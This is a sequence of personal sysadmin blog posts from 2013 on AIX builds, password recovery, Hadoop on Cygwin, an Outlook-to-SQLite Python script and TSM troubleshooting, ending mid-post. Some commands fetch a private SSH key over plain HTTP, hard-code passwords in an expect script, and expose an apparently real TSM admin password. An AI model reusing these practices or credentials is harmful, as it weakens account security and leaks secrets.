<li>build ares.so<br> 1.change folder to c-ares and then run <code>configure CONFIG_COMMANDS= CONFIG_FILES=</code><br> In file gevent&#x2F;dnshelper.c, replace<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#ifdef HAVE_NETDB_H</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
to<br><code>#include &lt;netdb.h&gt;</code> reason: Error throw “dereferencing pointer to incomplete type” <strong>Ref to</strong><br><a target="_blank" rel="noopener" href="http://richliu.pixnet.net/blog/post/25765892-gcc-%3A-error%3A-dereferencing-pointer-to-incomplete-type">http://richliu.pixnet.net/blog/post/25765892-gcc-%3A-error%3A-dereferencing-pointer-to-incomplete-type</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/david_xtd/article/details/7781160">http://blog.csdn.net/david_xtd/article/details/7781160</a><br><a target="_blank" rel="noopener" href="http://liuzhigong.blog.163.com/blog/static/1782723752011314113857852/">http://liuzhigong.blog.163.com/blog/static/1782723752011314113857852/</a></li>
</ul>
<p>2.build share object</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -fno-tree-dominator-opts -I/opt/freeware/include/python2.7 -Ic-ares gevent/gevent.ares.c -c -o build/gevent/gevent.ares.o</span><br><span class="line">gcc -pthread -shared -lpython2.7 -L/home/sms_dev/soft/usr/local/c-ares/lib -lcares -lrt -o build/gevent/ares.so build/gevent/gevent.ares.o</span><br></pre></td></tr></table></figure>

<ul>
<li><p>build semaphore.so </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -fno-tree-dominator-opts -I/opt/freeware/include/python2.7 gevent/gevent.**semaphore.c -c -o build/gevent/gevent.**semaphore.o </span><br><span class="line">gcc -pthread -shared -lpython2.7 build/gevent/gevent.**semaphore.o -o build/gevent/**semaphore.so</span><br></pre></td></tr></table></figure>
</li>
<li><p>build **util.so </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -fno-tree-dominator-opts -I/opt/freeware/include/python2.7 gevent/gevent.**util.c -c -o build/gevent/gevent._util.o </span><br><span class="line">gcc -pthread -shared -lpython2.7 build/gevent/gevent.**util.o -o build/gevent/**util.so</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://blog.longwin.com.tw/2013/03/linux-a-so-la-library-diff-2013/">Linux 的 .a &#x2F; .so &#x2F; .la 函式庫的差異</a><br><a target="_blank" rel="noopener" href="http://bbs.chinaunix.net/thread-1332374-1-1.html">问个.a和.so的区别</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/rich_baba/article/details/6138110">Linux下静态链接库与动态链接库的区别</a><br><a target="_blank" rel="noopener" href="http://yxmhero1989.blog.163.com/blog/static/11215795620131124944442/">凡你醉处 你说过 皆非他乡</a><br><a target="_blank" rel="noopener" href="http://blog.ez2learn.com/2010/07/17/talk-about-coroutine-and-gevent/">淺談coroutine與gevent</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Reset-password-through-web-console" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-30T07:25:19.000Z"><a href="/2013/12/30/Reset-password-through-web-console/">2013-12-30</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/30/Reset-password-through-web-console/">Reset password through web console</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>I have a web console in AIX, but | (pipe stream), &amp;raquo; and &gt; do not work. How can I reset my password for account xx.</p>
<h1 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/xx/.ssh</span><br><span class="line">ssh-keygen -t rsa -P password -f /home/xx/.ssh/id_rsa (ssh-keygen -t rsa -P &#x27;&#x27; -f /home/xx/.ssh/id_rsa not work since no passphase)</span><br><span class="line">cp id_rsa.pub authorized_keys</span><br><span class="line">chmod 600 /home/xx/.ssh/authorized_keys</span><br><span class="line">chown -R xx:sms /home/xx/.ssh</span><br><span class="line">chmod 700 /home/xx/.ssh</span><br><span class="line">cat /home/xx/.ssh/id_rsa(then copy and paste in web console, save as id_rsa, then save as private key in putty)</span><br></pre></td></tr></table></figure>

<h1 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpm or download **wget** prepare id_rsa, id_rsa.pub, authorized_keys</span><br><span class="line">/home/xx/soft/usr/local/bin/wget -O /home/xx/.ssh/id_rsa http://10.13.135.40:8080/dh/keygen/id_rsa</span><br><span class="line">/home/xx/soft/usr/local/bin/wget -O /home/xx/.ssh/id_rsa.pub http://10.13.135.40:8080/dh/keygen/id_rsa.pub</span><br><span class="line">/home/xx/soft/usr/local/bin/wget -O /home/xx/.ssh/authorized_keys http://10.13.135.40:8080/dh/keygen/authorized_keys</span><br><span class="line">chown -R xx:sms /home/xx/.ssh</span><br><span class="line">chmod 700 /home/xx/.ssh</span><br></pre></td></tr></table></figure>

<h1 id="method-3-fail-in-AIX"><a href="#method-3-fail-in-AIX" class="headerlink" title="method 3 (fail in AIX)"></a>method 3 (fail in AIX)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xx1234\nxx1234&quot; | (passwd -stdin xx)</span><br><span class="line">echo -e &quot;xx1234\nxx1234&quot; | (passwd -stdin xx) – in Linux</span><br></pre></td></tr></table></figure>

<h1 id="method-4-fail-in-AIX"><a href="#method-4-fail-in-AIX" class="headerlink" title="method 4 (fail in AIX)"></a>method 4 (fail in AIX)</h1><p><code>echo &quot;xx:xx1234&quot; | chpasswd -c</code></p>
<h1 id="method-5"><a href="#method-5" class="headerlink" title="method 5"></a>method 5</h1><p>download expect package from <a target="_blank" rel="noopener" href="http://www.oss4aix.org/download/RPMS/">http://www.oss4aix.org/download/RPMS/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh libpng-1.6.7-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh zlib-1.2.8-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh bzip2-1.0.6-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh freetype2-2.5.2-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh expat-2.1.0-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh fontconfig-2.10.2-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh tk-8.5.15-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh tcl-8.5.15-1.aix5.1.ppc.rpm</span><br><span class="line">rpm -ivh expect-5.45-1.aix5.1.ppc.rpm</span><br></pre></td></tr></table></figure>
<p>write expect script &#x2F;home&#x2F;xx&#x2F;chpass.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/expect</span><br><span class="line">spawn passwd support</span><br><span class="line">expect &quot;*password*&quot;</span><br><span class="line">send &quot;xx1234\n&quot;</span><br><span class="line">expect &quot;*password*&quot;</span><br><span class="line">send &quot;xx1234\n&quot; exit</span><br></pre></td></tr></table></figure>

<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><p>I try different account to login system, grant sudo right to this account, change the password using pwdadm and passwd, but when I login with <strong>putty</strong>, found that Access denied. When I run su - user, found “3004-303 There have been too many unsuccessful login attempts; please see the system administrator”, found the root cause, after google, easy two steps can sovle it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- /usr/sbin/lsuser -a unsuccessful_login_count user</span><br><span class="line">- /usr/bin/chsec -f /etc/security/lastlog -a unsuccessful_login_count=0 -s user</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://aix4admins.blogspot.hk/2012/06/user-login-process-login-process.html">http://aix4admins.blogspot.hk/2012/06/user-login-process-login-process.html</a><br><a target="_blank" rel="noopener" href="http://hi.baidu.com/unixsec/item/fa155d8e16cb0cdf5e0ec157&quot;">http://hi.baidu.com/unixsec/item/fa155d8e16cb0cdf5e0ec157&quot;</a><br><a target="_blank" rel="noopener" href="http://publib.boulder.ibm.com/infocenter/aix/v7r1/index.jsp?topic=/com.ibm.aix.cmds/doc/aixcmds4/pwdadm.htm">pwdadm 命令</a></p>
<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a target="_blank" rel="noopener" href="http://expectsourceforge.net/">expect</a><br><a target="_blank" rel="noopener" href="http://expect-lite.sourceforge.net/">expect-lite</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-What-stuff-in-XBian" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-20T09:17:14.000Z"><a href="/2013/12/20/What-stuff-in-XBian/">2013-12-20</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/20/What-stuff-in-XBian/">What stuff in XBian</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>airplay using ios7</li>
<li>chinese environmnet<ul>
<li><code>$ sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</code></li>
<li><code>$ sudo dpkg-reconfigure locales</code> 將zh_SG.UTF-8設定為預設的locale。</li>
</ul>
</li>
<li><code>sudo apt-get install scim scim-tables-zh scim-pinyin</code> 重開機後，以Ctrl-Space即可切換輸入法，輸入中文。</li>
<li>&#x2F;etc&#x2F;apt&#x2F;apt.conf<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Acquire::http::Proxy &quot;http://proxy.server:port&quot;;</span><br><span class="line">Acquire::http::Proxy &quot;http://username:password@proxy.server:port&quot;;</span><br></pre></td></tr></table></figure></li>
<li>Download xbmc addons <a target="_blank" rel="noopener" href="https://code.google.com/p/xbmc-addons-chinese/">https://code.google.com/p/xbmc-addons-chinese/</a></li>
<li>vnc <a target="_blank" rel="noopener" href="https://github.com/hanzelpeter/dispmanx_vnc">https://github.com/hanzelpeter/dispmanx_vnc</a></li>
</ul>
<p>Reference<br><a target="_blank" rel="noopener" href="http://yehnan.blogspot.hk/2012/08/raspberry-pi.html">http://yehnan.blogspot.hk/2012/08/raspberry-pi.html</a><br><a target="_blank" rel="noopener" href="http://askubuntu.com/questions/109673/how-to-use-apt-get-via-http-proxy-like-this">http://askubuntu.com/questions/109673/how-to-use-apt-get-via-http-proxy-like-this</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-hadoop-in-win7-with-cygwin" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-18T01:29:34.000Z"><a href="/2013/12/18/hadoop-in-win7-with-cygwin/">2013-12-18</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/18/hadoop-in-win7-with-cygwin/">hadoop in win7 with cygwin</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Download ‘setup.exe’ from Cygwin website</li>
<li>Download hadoop 0.20.2 and hbase 0.20.6 from apache website</li>
<li>Add user hadoop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ net user hadoop password /add /yes</span><br><span class="line">$ net localgroup administrator hadoop /add</span><br><span class="line">$ mkpassd -l -u hadoop &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure></li>
<li>Add sshd service<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cygrunsrv.exe –remove sshd (no necessary)</span><br><span class="line">$ ssh-host-config -y</span><br><span class="line">$ cygrunsrv.exe –start sshd</span><br></pre></td></tr></table></figure></li>
<li>Generate ssh key<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t dsa -P &#x27;&#x27; -f ~/.ssh/id_dsa</span><br><span class="line">$ cat ~/.ssh/id_dsa.pub &amp;raquo; ~/.ssh/authorized_keys</span><br><span class="line">$ chmod 600 ~/.ssh/authorized_keys</span><br><span class="line">$ scp ~/.ssh/id_dsa.pub ~/.ssh/authorized_keys 10.13.136.250:/home/hadoop/.ssh</span><br></pre></td></tr></table></figure></li>
<li>Edit file as below<ul>
<li>core-site.xml</li>
<li>hdfs-site.xml</li>
<li>mapred-site.xml</li>
<li>hadoop-env.sh</li>
</ul>
</li>
</ul>
<h1 id="Referece"><a href="#Referece" class="headerlink" title="Referece"></a>Referece</h1><p><a target="_blank" rel="noopener" href="http://mukulcygwin.blogspot.hk/">Cygwin for Hadoop (Win 7)</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/tariqmislam/2159173">Setting Up Hadoop 0.20.2 on Windows 7 With Cygwin</a><br><a target="_blank" rel="noopener" href="http://trac.nchc.org.tw/cloud/wiki/Hadoop4Win">Hadoop for Windows using Cygwin</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Get-back-the-console-in-xbian-when-booting" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-13T05:30:25.000Z"><a href="/2013/12/13/Get-back-the-console-in-xbian-when-booting/">2013-12-13</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/13/Get-back-the-console-in-xbian-when-booting/">Get back the console in xbian when booting</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>system -&gt; setting -&gt; xbian -&gt; service -&gt; disable xbmc autostart- </li>
<li>set parameter in &#x2F;etc&#x2F;wpa_supplicant.conf</li>
<li>restart wlan0 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ifconfig wlan0 down</span><br><span class="line"># ifconfig wlan0 up </span><br><span class="line"># wpa_supplicant -B -c /etc/wpa_supplicant.conf -i wlan0</span><br></pre></td></tr></table></figure></li>
<li>start xbmc service <code># sudo service xbmc start</code> or <code># sudo xbian-config services start xbmc</code></li>
</ul>
<p>Encountered problem: </p>
<ul>
<li>showing <code>fs resize</code> and halt in screen</li>
</ul>
<p>Solution: </p>
<ul>
<li>remove <code>splash</code> and <code>quiet</code> in cmdline.txt</li>
</ul>
<p>Reference<br><a target="_blank" rel="noopener" href="https://github.com/xbianonpi/xbian-config-bash/wiki/Services">xbian-config-bash</a><br><a target="_blank" rel="noopener" href="http://my.oschina.net/l1z2g9/blog/109548">Install Mercury MW150US WIFI dongle on RPi</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Read-mails-from-Outlook-using-python" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-11T06:11:36.000Z"><a href="/2013/12/11/Read-mails-from-Outlook-using-python/">2013-12-11</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/11/Read-mails-from-Outlook-using-python/">Read mails from Outlook using python</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="code-as-following"><a href="#code-as-following" class="headerlink" title="code as following"></a>code as following</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import win32com.client, sqlite3</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">def collectMail():</span><br><span class="line">    conn = sqlite3.connect(&#x27;outlook.db&#x27;)</span><br><span class="line">    i = 0</span><br><span class="line">    try:</span><br><span class="line">        outlook = win32com.client.Dispatch(&quot;Outlook.Application&quot;).GetNamespace(&quot;MAPI&quot;)</span><br><span class="line"></span><br><span class="line">        inbox = outlook.GetDefaultFolder(6)</span><br><span class="line">        messages = inbox.Items</span><br><span class="line">        print &#x27;total messages: &#x27;, len(messages)</span><br><span class="line">        message = messages.GetFirst ()</span><br><span class="line">        while message:</span><br><span class="line">            i += 1</span><br><span class="line">            try:</span><br><span class="line">                subject = message.Subject</span><br><span class="line">                #print i, subject</span><br><span class="line"></span><br><span class="line">                received_time = str(message.ReceivedTime)</span><br><span class="line">                #print received_time</span><br><span class="line">                received_time = datetime.strptime(received_time, &#x27;%m/%d/%y %H:%M:%S&#x27;)</span><br><span class="line">                #print message.EntryID</span><br><span class="line">                html_body = message.HTMLBody</span><br><span class="line">                size = long(message.Size)</span><br><span class="line"></span><br><span class="line">                sender =  message.SenderName</span><br><span class="line">                receiver = message.To</span><br><span class="line">                cc = message.Cc</span><br><span class="line">                body = message.Body</span><br><span class="line">                conn.execute(&#x27;insert into outlook(SUBJECT, SENDER, RECEIVER, CC, SIZE, RECEIVED_TIME, BODY, HTML_BODY) values(?, ?, ?, ?, ?, ?, ?, ?)&#x27;, (subject, sender, receiver, cc, size, received_time, body, html_body))</span><br><span class="line">                conn.commit()</span><br><span class="line">            except:</span><br><span class="line">                print i, &#x27;skip&#x27;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            message = messages.GetNext()</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;connection closed&#x27;</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">collectMail()</span><br></pre></td></tr></table></figure>

<h1 id="sql-to-create-table"><a href="#sql-to-create-table" class="headerlink" title="sql to create table"></a>sql to create table</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create table outlook(</span><br><span class="line">ID INTEGER PRIMARY KEY   AUTOINCREMENT,</span><br><span class="line">SUBJECT VARCHAR(200) NOT NULL,</span><br><span class="line">SENDER VARCHAR(200) NOT NULL,</span><br><span class="line">RECEIVER VARCHAR(200) NOT NULL,</span><br><span class="line">CC  VARCHAR(200) NOT NULL,</span><br><span class="line">SIZE LONG NOT NULL,</span><br><span class="line">RECEIVED_TIME DATETIME,</span><br><span class="line">BODY TEXT,</span><br><span class="line">HTML_BODY TEXT);</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/18761465/python-script-to-read-the-emails-from-custom-folder-from-microsoft-outlook-mailb">python-script-to-read-the-emails-from-custom-folder-from-microsoft-outlook-mailb</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/5077625/reading-e-mails-from-outlook-with-python-through-mapi">reading-e-mails-from-outlook-with-python-through-mapi</a><br><a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/microsoft.office.interop.outlook.aspx">microsoft.office.interop.outlook</a><br><a target="_blank" rel="noopener" href="http://www.tutorialspoint.com/sqlite/sqlite_using_autoincrement.htm">sqlite_using_autoincrement</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-vanish squid)-+-HAProxy-+-nginx-+-memcached redis)" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-10T09:09:31.000Z"><a href="/2013/12/10/vanish%20squid)-+-HAProxy-+-nginx-+-memcached%20redis)/">2013-12-10</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/10/vanish%20squid)-+-HAProxy-+-nginx-+-memcached%20redis)/">vanish(squid) + HAProxy + nginx + memcached(redis)</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="1-Load-balance-then-cache"><a href="#1-Load-balance-then-cache" class="headerlink" title="1. Load-balance then cache"></a>1. Load-balance then cache</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                           +-- Cache server #1 (varnish) -- App server #1</span><br><span class="line">                          /</span><br><span class="line">Load Balancer (haproxy)-+---- Cache server #2 (varnish) --  App server #2</span><br><span class="line">                          \</span><br><span class="line">                           +-- Cache server #3 (varnish) -- App server #3</span><br></pre></td></tr></table></figure>
<h1 id="2-Cache-then-load-balance"><a href="#2-Cache-then-load-balance" class="headerlink" title="2. Cache then load-balance"></a>2. Cache then load-balance</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                                       +-- App server #1</span><br><span class="line">                                                      /</span><br><span class="line">Cache Server (varnish) --- Load Balancer (haproxy) --+---- App server #2</span><br><span class="line">                                                      \</span><br><span class="line">                                                       +-- App server #3</span><br></pre></td></tr></table></figure>

<p>I. stunnel -&gt; vanish -&gt; HAProxy -&gt; nginx -&gt; nodeJS -&gt; memcached(redis) (for sesson storage)<br>II. nginx (for HTTP compression) –&gt; Varnish cache (for caching) –&gt; HTTP level load balancer (HAProxy, or nginx, or the Varnish built-in) –&gt; webservers.<br>III. Apache Traffic Server&#x2F;Squid&#x2F;Vanish + HAProxy + Nginx + memcached(Redis) (for sesson storage)</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://serverfault.com/questions/204025/ordering-1-nginx-2-varnish-3-haproxy-4-webserver">http://serverfault.com/questions/204025/ordering-1-nginx-2-varnish-3-haproxy-4-webserver</a><br><a target="_blank" rel="noopener" href="http://yaozb.blog.51cto.com/2762349/793875">http://yaozb.blog.51cto.com/2762349/793875</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/15448196/haproxy-in-front-of-varnish-or-the-other-way-round">http://stackoverflow.com/questions/15448196/haproxy-in-front-of-varnish-or-the-other-way-round</a><br><a target="_blank" rel="noopener" href="http://blog.exceliance.fr/2012/08/25/haproxy-varnish-and-the-single-hostname-website/">http://blog.exceliance.fr/2012/08/25/haproxy-varnish-and-the-single-hostname-website/</a><br><a target="_blank" rel="noopener" href="http://serverfault.com/questions/51691/need-haproxy-varnish-nginx-setup-suggestions">http://serverfault.com/questions/51691/need-haproxy-varnish-nginx-setup-suggestions</a><br><a target="_blank" rel="noopener" href="https://www.exratione.com/2012/08/websockets-over-ssl-stunnel-varnish-nginx-nodejs/">https://www.exratione.com/2012/08/websockets-over-ssl-stunnel-varnish-nginx-nodejs/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Fail-to-get-tape-drive-inventory-on-TSM" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-12-03T02:50:39.000Z"><a href="/2013/12/03/Fail-to-get-tape-drive-inventory-on-TSM/">2013-12-03</a></time>
      
      
  
    <h1 class="title"><a href="/2013/12/03/Fail-to-get-tape-drive-inventory-on-TSM/">Fail to get tape drive inventory on TSM</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>tapeutil -f &#x2F;dev&#x2F;smc0 inventory | more</li>
<li>errpt -aj indentifierID</li>
<li>dsmadmc -id&#x3D;support -password&#x3D;lovedh02</li>
<li>q drive f&#x3D;d</li>
<li>q path f&#x3D;d</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21600215">Basic Troubleshooting Steps for Libraries and Tape Drives for Tivoli Storage Manager on AIX</a></a><br><a target="_blank" rel="noopener" href="http://pic.dhe.ibm.com/infocenter/powersys/v3r1m5/index.jsp?topic=/areah/areaixfastpath.htm">AIX fast-path problem isolation</a><br><a target="_blank" rel="noopener" href="http://pic.dhe.ibm.com/infocenter/powersys/v3r1m5/index.jsp?topic=/arecr/arecrx0050.htm">MAP 0050: SCSI bus problems</a><br><a target="_blank" rel="noopener" href="http://pic.dhe.ibm.com/infocenter/powersys/v3r1m5/index.jsp?topic=/areah/aixserviceaids.htm">AIX tasks and service aids</a><br><a target="_blank" rel="noopener" href="http://pic.dhe.ibm.com/infocenter/etc/serv/index.jsp?topic=/com.ibm.storage.etc.service.doc/areaixfastpath.html">Advanced Interactive Executive fast-path problem isolation</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-memcached-&amp;-redis-&amp;-tokyocabinet-&amp;-whitedb-in-AIX" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-11-18T06:02:16.000Z"><a href="/2013/11/18/Install-memcached-&-redis-&-tokyocabinet-&-whitedb-in-AIX/">2013-11-18</a></time>
      
      
  
    <h1 class="title"><a href="/2013/11/18/Install-memcached-&-redis-&-tokyocabinet-&-whitedb-in-AIX/">Install memcached &amp; redis &amp; tokyocabinet &amp; whitedb in AIX</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h1><ul>
<li><p>for GNU make, download gmake from <a target="_blank" rel="noopener" href="http://www.bullfreeware.com/affichage.php?id=1264">http://www.bullfreeware.com/affichage.php?id=1264</a></p>
</li>
<li><p>Download libevent-2.0.21-stable.tar.gz and memcached-1.4.15.tar.gz from offical website</p>
</li>
<li><p>Configure &amp; Install</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/home/action/libevent</span><br><span class="line">./configure --with-libevent=/home/action/libevent/ --prefix=/home/action/memcached</span><br></pre></td></tr></table></figure></li>
<li><p>Rename method</p>
